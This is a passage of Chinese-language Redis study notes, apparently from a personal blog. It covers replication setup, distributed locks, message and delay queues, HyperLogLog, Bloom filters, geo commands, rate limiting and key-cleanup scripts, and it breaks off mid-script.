<h3 id="主从配置"><a href="#主从配置" class="headerlink" title="主从配置"></a>主从配置</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/local/redis/redis.conf /usr/local/redis/redis<span class="number">.6380</span>.conf</span><br><span class="line"></span><br><span class="line">[root@localhost redis]# vim /etc/redis/redis.conf</span><br><span class="line">bind 0.0.0.0 # 绑定允许访问的ip地址，如本机模拟主从可不改变值仍使用127.0.0.1</span><br><span class="line"></span><br><span class="line">[root@localhost redis]# vim /usr/local/redis/redis.6380.conf</span><br><span class="line">port 6380 # 将端口更改为6380</span><br><span class="line">slaveof 127.0.0.1 6379 # 指定master ip port</span><br><span class="line"></span><br><span class="line">[root@localhost redis]# redis-server /usr/local/redis/redis.conf # 启动master</span><br><span class="line">[root@localhost redis]# redis-server /usr/local/redis/redis.6380.conf # 启动slave</span><br><span class="line">查看 Master 状态</span><br><span class="line"></span><br><span class="line">[liubo@localhost ~]$ redis-cli -p <span class="number">6379</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; info</span><br><span class="line"># Server</span><br><span class="line">……</span><br><span class="line"># Clients</span><br><span class="line">……</span><br><span class="line"># Memory</span><br><span class="line">……</span><br><span class="line"># Persistence</span><br><span class="line">……</span><br><span class="line"># Stats</span><br><span class="line">……</span><br><span class="line"># Replication # 关注此区域</span><br><span class="line">role:master # 当前角色,master</span><br><span class="line">connected_slaves:1 # 已连接slave：1个</span><br><span class="line">slave0:ip=127.0.0.1,port=6380,state=online,offset=56,lag=1 # slave0信息</span><br><span class="line">master_replid:<span class="number">7e3</span>b0e1accd31abaf58177160685d51952ea1e90</span><br><span class="line">master_replid2:<span class="number">0000000000000000000000000000000000000000</span></span><br><span class="line">master_repl_offset:<span class="number">56</span></span><br><span class="line">second_repl_offset:<span class="number">-1</span></span><br><span class="line">repl_backlog_active:<span class="number">1</span></span><br><span class="line">repl_backlog_size:<span class="number">1048576</span></span><br><span class="line">repl_backlog_first_byte_offset:<span class="number">1</span></span><br><span class="line">repl_backlog_histlen:<span class="number">56</span></span><br><span class="line"># CPU</span><br><span class="line">……</span><br><span class="line"># Cluster</span><br><span class="line">……</span><br><span class="line">查看 Slave 状态</span><br><span class="line"></span><br><span class="line">[liubo@localhost ~]$ redis-cli -p <span class="number">6380</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; info</span><br><span class="line"># Server</span><br><span class="line">……</span><br><span class="line"># Clients</span><br><span class="line">……</span><br><span class="line"># Memory</span><br><span class="line">……</span><br><span class="line"># Persistence</span><br><span class="line">……</span><br><span class="line"># Stats</span><br><span class="line">……</span><br><span class="line"># Replication # 关注此区域</span><br><span class="line">role:slave # 当前角色,slave</span><br><span class="line">master_host:127.0.0.1 # master相关信息</span><br><span class="line">master_port:<span class="number">6379</span></span><br><span class="line">master_link_status:up # 连接master状态</span><br><span class="line">master_last_io_seconds_ago:<span class="number">4</span></span><br><span class="line">master_sync_in_progress:<span class="number">0</span></span><br><span class="line">slave_repl_offset:<span class="number">84</span></span><br><span class="line">slave_priority:<span class="number">100</span></span><br><span class="line">slave_read_only:<span class="number">1</span></span><br><span class="line">connected_slaves:<span class="number">0</span></span><br><span class="line">master_replid:<span class="number">7e3</span>b0e1accd31abaf58177160685d51952ea1e90</span><br><span class="line">master_replid2:<span class="number">0000000000000000000000000000000000000000</span></span><br><span class="line">master_repl_offset:<span class="number">84</span></span><br><span class="line">second_repl_offset:<span class="number">-1</span></span><br><span class="line">repl_backlog_active:<span class="number">1</span></span><br><span class="line">repl_backlog_size:<span class="number">1048576</span></span><br><span class="line">repl_backlog_first_byte_offset:<span class="number">1</span></span><br><span class="line">repl_backlog_histlen:<span class="number">84</span></span><br><span class="line"># CPU</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//learnku.com/index.php/articles/30765</span></span><br></pre></td></tr></table></figure>
<h3 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line">$ok = $redis-&gt;setNX($key, $value);</span><br><span class="line"><span class="keyword">if</span> ($ok) &#123;</span><br><span class="line">    <span class="comment">//获取到锁</span></span><br><span class="line">    ... do something ...</span><br><span class="line">    $redis-&gt;del($key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$redis-&gt;multi();</span><br><span class="line">$redis-&gt;setNX($key, $value);</span><br><span class="line">$redis-&gt;expire($key, $ttl);</span><br><span class="line">$res = $redis-&gt;exec();</span><br><span class="line"><span class="keyword">if</span>($res[<span class="number">0</span>]) &#123;</span><br><span class="line">    <span class="comment">//获取到锁</span></span><br><span class="line">    ... do something ...</span><br><span class="line">    $redis-&gt;del($key);</span><br><span class="line">&#125;</span><br><span class="line">$script = &lt;&lt;&lt;EOT</span><br><span class="line">    local key   = KEYS[1]</span><br><span class="line">    local value = KEYS[2]</span><br><span class="line">    local ttl   = KEYS[3]</span><br><span class="line"></span><br><span class="line">    local ok = redis.call('setnx', key, value)</span><br><span class="line"></span><br><span class="line">    if ok == 1 then</span><br><span class="line">    redis.call('expire', key, ttl)</span><br><span class="line">    end</span><br><span class="line">    return ok</span><br><span class="line">EOT;</span><br><span class="line"></span><br><span class="line">$res = $redis-&gt;eval($script, [$key,$val, $ttl], 3);</span><br><span class="line">if($res) &#123;</span><br><span class="line">    //获取到锁https://learnku.com/articles/30827</span><br><span class="line">    ... do something ...</span><br><span class="line">    $redis-&gt;del($key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ok = $redis-&gt;set($key, $random, array('nx', 'ex' =&gt; $ttl));</span><br><span class="line"></span><br><span class="line">if ($ok) &#123;</span><br><span class="line">    //获取到锁</span><br><span class="line">    ... do something ...</span><br><span class="line">    if ($redis-&gt;get($key) == $random) &#123;</span><br><span class="line">        $redis-&gt;del($key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">引入了一个随机数，这是为了防止逻辑处理时间过长导致锁的过期时间已经失效，这时候下一个请求就获得了锁，但是前一个请求在逻辑处理完直接删除了锁。</span><br><span class="line"></span><br><span class="line">锁主要用在并发请求如秒杀等场景中，以上便是 redis 锁的实现。</span><br></pre></td></tr></table></figure>
<h3 id="异步消息队列与延时队列"><a href="#异步消息队列与延时队列" class="headerlink" title="异步消息队列与延时队列"></a>异步消息队列与延时队列</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//发送消息</span></span><br><span class="line">$redis-&gt;lPush($list, $value);</span><br><span class="line"></span><br><span class="line"><span class="comment">//消费消息</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $msg = $redis-&gt;rPop($list);</span><br><span class="line">        <span class="keyword">if</span> (!$msg) &#123;</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//业务处理</span></span><br><span class="line">     </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">        echo $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">blpop/brpop在队列没有数据的时候，会立即进入休眠状态，一旦数据到来，则立刻醒过来。消息的延迟几乎为零。用blpop/brpop替代前面的lpop/rpop，就完美解决了上面的问题。</span><br><span class="line">将有序集合的value设置为我们的消息任务，把value的score设置为消息的到期时间，然后轮询获取有序集合的中的到期消息进行处理。</span><br><span class="line">实现代码如下：</span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line"></span><br><span class="line">$redis-&gt;zAdd($delayQueue,$tts, $value);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $msg = $redis-&gt;zRangeByScore($delayQueue,<span class="number">0</span>,time(),<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(!$msg)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//删除消息</span></span><br><span class="line">        $ok = $redis.zrem($delayQueue,$msg);</span><br><span class="line">        <span class="keyword">if</span>($ok)&#123;</span><br><span class="line">            <span class="comment">//业务处理</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(\Exception $e) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30826</span></span><br><span class="line">HyperLogLog 算法是一种非常巧妙的近似统计海量去重元素数量的算法。它内部维护了 <span class="number">16384</span> 个桶（bucket）来记录各自桶的元素数量。当一个元素到来时，它会散列到其中一个桶，以一定的概率影响这个桶的计数值。因为是概率算法，所以单个桶的计数值并不准确，但是将所有的桶计数值进行调合均值累加起来，结果就会非常接近真实的计数值。</span><br><span class="line"></span><br><span class="line">pfadd 增加计数</span><br><span class="line">pfcount 获取计数</span><br><span class="line">HyperLogLog 还提供了第三个指令 pfmerge，用于将多个 pf 计数值累加在一起形成一个新的 pf 值。</span><br><span class="line"></span><br><span class="line">比如在网站中我们有两个内容差不多的页面，运营需要将两个页面的数据进行合并。其中页面的 UV 访问量也需要合并，这时候就可以使用 pfmerge</span><br><span class="line">布隆过滤器可以理解为一个不怎么精确的 set 结构</span><br><span class="line">&gt; docker pull redislabs/rebloom # 拉取镜像</span><br><span class="line">&gt; docker run -p 6379:6379 redislabs/rebloom # 运行容器</span><br><span class="line">&gt; redis-cli # 连接容器中的 redis 服务</span><br><span class="line">bf.add 添加元素</span><br><span class="line">bf.exists 查询元素是否存在</span><br><span class="line">bf.madd 一次添加多个元素</span><br><span class="line">bf.mexists 一次查询多个元素是否存在</span><br><span class="line"></span><br><span class="line">主要是解决大规模数据下不需要精确过滤的场景，如检查垃圾邮件地址，爬虫 URL 地址去重，解决缓存穿透问题等。</span><br></pre></td></tr></table></figure>
<h3 id="geo"><a href="#geo" class="headerlink" title="geo"></a>geo</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">添加杭州北京上海的地理位置</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geoadd city <span class="number">120.20000</span> <span class="number">30.26667</span> hangzhou  <span class="number">116.41667</span> <span class="number">39.91667</span> beijing <span class="number">121.47</span> <span class="number">31.23</span> shanghai</span><br><span class="line">geopos 指令可以获取集合中任意元素的经纬度坐标，可以一次获取多个。</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geopos city hangzhou  beijing shanghai</span><br><span class="line"><span class="number">1</span>) <span class="number">1</span>) <span class="string">"120.15000075101852417"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"30.2800007575645509"</span></span><br><span class="line"><span class="number">2</span>) <span class="number">1</span>) <span class="string">"116.39999896287918091"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"39.90000009167092543"</span></span><br><span class="line"><span class="number">3</span>) <span class="number">1</span>) <span class="string">"121.47000163793563843"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"31.22999903975783553"</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geopos city hangzhou</span><br><span class="line"><span class="number">1</span>) <span class="number">1</span>) <span class="string">"120.15000075101852417"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"30.2800007575645509"</span></span><br><span class="line">计算距离</span><br><span class="line"></span><br><span class="line">距离单位可以是 m、km、ml、ft，分别代表米、千米、英里和尺。</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geodist city shanghai hangzhou  km</span><br><span class="line"><span class="string">"164.5694"</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geodist city beijing  hangzhou  km</span><br><span class="line"><span class="string">"1122.7998"</span></span><br><span class="line"></span><br><span class="line">例如查找距离杭州<span class="number">300</span>km以内的城市的<span class="number">10</span>个城市按距离排序</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; GEORADIUSBYMEMBER city hangzhou <span class="number">300</span> km WITHCOORD WITHDIST WITHHASH  ASC COUNT <span class="number">10</span></span><br><span class="line"><span class="number">1</span>) <span class="number">1</span>) <span class="string">"hangzhou"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"0.0000"</span></span><br><span class="line">   <span class="number">3</span>) (integer) <span class="number">4054134257390783</span></span><br><span class="line">   <span class="number">4</span>) <span class="number">1</span>) <span class="string">"120.15000075101852417"</span></span><br><span class="line">      <span class="number">2</span>) <span class="string">"30.2800007575645509"</span></span><br><span class="line"><span class="number">2</span>) <span class="number">1</span>) <span class="string">"shanghai"</span></span><br><span class="line">   <span class="number">2</span>) <span class="string">"164.5694"</span></span><br><span class="line">   <span class="number">3</span>) (integer) <span class="number">4054803462927619</span></span><br><span class="line">   <span class="number">4</span>) <span class="number">1</span>) <span class="string">"121.47000163793563843"</span></span><br><span class="line">      <span class="number">2</span>) <span class="string">"31.22999903975783553"</span></span><br><span class="line">在给定以下可选项时， 命令会返回额外的信息：</span><br><span class="line"></span><br><span class="line">WITHDIST ： 在返回位置元素的同时， 将位置元素与中心之间的距离也一并返回。 距离的单位和用户给定的范围单位保持一致。</span><br><span class="line">WITHCOORD ： 将位置元素的经度和维度也一并返回。</span><br><span class="line">WITHHASH ： 以 <span class="number">52</span> 位有符号整数的形式， 返回位置元素经过原始 geohash 编码的有序集合分值。</span><br><span class="line">ASC ： 根据中心的位置， 按照从近到远的方式返回位置元素。DESC ： 根据中心的位置， 按照从远到近的方式返回位置元素。</span><br><span class="line">获取元素的 hash 值</span><br><span class="line"></span><br><span class="line">可能你还注意到有一个命令 GEOHASH, 那他是做什么的呢</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geohash city hangzhou</span><br><span class="line"><span class="number">1</span>) <span class="string">"wtmkq069cc0"</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; geohash city beijing</span><br><span class="line"><span class="number">1</span>) <span class="string">"wx4fbxxfke0"</span></span><br><span class="line">返回的其实是元素的经纬度经过 goehash 计算后的 base32 编码字符串</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//geohash.org/wtmkq069cc0  进行直接定位 </span></span><br><span class="line">其存储结构主要使用的是 Redis 的有序结构，其 score 是 GeoHash 的 <span class="number">52</span> 位整数值</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; ZRANGE city <span class="number">0</span> <span class="number">-1</span> WITHSCORES</span><br><span class="line"><span class="number">1</span>) <span class="string">"hangzhou"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"4054134257390783"</span></span><br><span class="line"><span class="number">3</span>) <span class="string">"shanghai"</span></span><br><span class="line"><span class="number">4</span>) <span class="string">"4054803462927619"</span></span><br><span class="line"><span class="number">5</span>) <span class="string">"beijing"</span></span><br><span class="line"><span class="number">6</span>) <span class="string">"4069885360207904"</span></span><br></pre></td></tr></table></figure>
<h3 id="限流"><a href="#限流" class="headerlink" title="限流"></a>限流</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">在高并发场景下有三把利器保护系统：缓存、降级、和限流。缓存的目的是提升系统的访问你速度和增大系统能处理的容量；降级是当服务出问题或影响到核心流程的性能则需要暂时屏蔽掉。而有些场景则需要限制并发请求量，如秒杀、抢购、发帖、评论、恶意爬虫等。</span><br><span class="line"></span><br><span class="line">限流算法</span><br><span class="line">常见的限流算法有：计数器，漏桶、令牌桶。</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isActionAllowed</span>(<span class="params">$userId, $action, $period, $maxCount</span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $redis = <span class="keyword">new</span> Redis();</span><br><span class="line">    $redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line">    $key = sprintf(<span class="string">'hist:%s:%s'</span>, $userId, $action);</span><br><span class="line">    $now = msectime();   # 毫秒时间戳</span><br><span class="line"></span><br><span class="line">    $pipe=$redis-&gt;multi(Redis::PIPELINE); <span class="comment">//使用管道提升性能</span></span><br><span class="line">    $pipe-&gt;zadd($key, $now, $now); <span class="comment">//value 和 score 都使用毫秒时间戳</span></span><br><span class="line">    $pipe-&gt;zremrangebyscore($key, <span class="number">0</span>, $now - $period); <span class="comment">//移除时间窗口之前的行为记录，剩下的都是时间窗口内的</span></span><br><span class="line">    $pipe-&gt;zcard($key);  <span class="comment">//获取窗口内的行为数量</span></span><br><span class="line">    $pipe-&gt;expire($key, $period + <span class="number">1</span>);  <span class="comment">//多加一秒过期时间</span></span><br><span class="line">    $replies = $pipe-&gt;exec();</span><br><span class="line">    <span class="keyword">return</span> $replies[<span class="number">2</span>] &lt;= $maxCount;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;<span class="number">20</span>; $i++)&#123;</span><br><span class="line">    var_dump(isActionAllowed(<span class="string">"110"</span>, <span class="string">"reply"</span>, <span class="number">60</span>*<span class="number">1000</span>, <span class="number">5</span>)); <span class="comment">//执行可以发现只有前5次是通过的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回当前的毫秒时间戳</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">msectime</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    list($msec, $sec) = explode(<span class="string">' '</span>, microtime());</span><br><span class="line">    $msectime = (float)sprintf(<span class="string">'%.0f'</span>, (floatval($msec) + floatval($sec)) * <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">return</span> $msectime;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="redis-删除大key集合的方法"><a href="#redis-删除大key集合的方法" class="headerlink" title="redis 删除大key集合的方法"></a>redis 删除大key集合的方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    # StrictRedis创建连接时，这个连接由连接池管理，所以我们无需关注连接是否需要主动释放http://www.ikeguang.com/2019/03/14/redis-del-security/</span><br><span class="line">	re = redis.StrictRedis(host = <span class="string">"0.0.0.0"</span>,port = <span class="number">6379</span>,password = <span class="string">"123"</span>)</span><br><span class="line">	key = <span class="string">"test"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>):</span><br><span class="line">		re.sadd(key, i)</span><br><span class="line"></span><br><span class="line">	cursor = <span class="string">'0'</span></span><br><span class="line">	cou = <span class="number">200</span></span><br><span class="line">	<span class="keyword">while</span> cursor != <span class="number">0</span>:</span><br><span class="line">		cursor,data = re.sscan(name = key, cursor = cursor, count = cou)</span><br><span class="line">		<span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">			re.srem(key, item)</span><br><span class="line">		print cursor</span><br></pre></td></tr></table></figure>
<h3 id="删除redis中过时的key"><a href="#删除redis中过时的key" class="headerlink" title="删除redis中过时的key"></a>删除redis中过时的key</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python</span></span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line"># 需要手动删除redis中某一天产生的key</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"># 执行 shell 命令</span><br><span class="line">def execCmd(cmd):</span><br><span class="line">	print cmd</span><br><span class="line">	<span class="keyword">return</span> commands.getstatusoutput(cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	args = sys.argv</span><br><span class="line">	<span class="keyword">if</span> len(args) != <span class="number">4</span>:</span><br><span class="line">		print <span class="string">'please input correct cmd argument, like python /home/hadoop/scripts/rediskey.py 2018-08-01 port passwd'</span></span><br><span class="line">		sys.exit(<span class="number">1</span>)</span><br><span class="line">	date = args[<span class="number">1</span>]</span><br><span class="line">	port = args[<span class="number">2</span>]</span><br><span class="line">	passwd = args[<span class="number">3</span>]</span><br><span class="line">	keyPath = <span class="string">'/home/hadoop/scripts/rediskey.txt'</span></span><br><span class="line">	cmd = <span class="string">'/app/local/redis-3.2.11/src/redis-cli -h 0.0.0.0 -p %s -a %s keys *%s* &gt; %s'</span>%(port, passwd, date, keyPath)</span><br><span class="line">	(status,result) = execCmd(cmd)</span><br><span class="line">	<span class="keyword">if</span> status == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">with</span> open(keyPath) <span class="keyword">as</span> f:</span><br><span class="line">			line = f.readline()</span><br><span class="line">			<span class="keyword">while</span> line:</span><br><span class="line">				key = line.strip()</span><br><span class="line">				cmd = 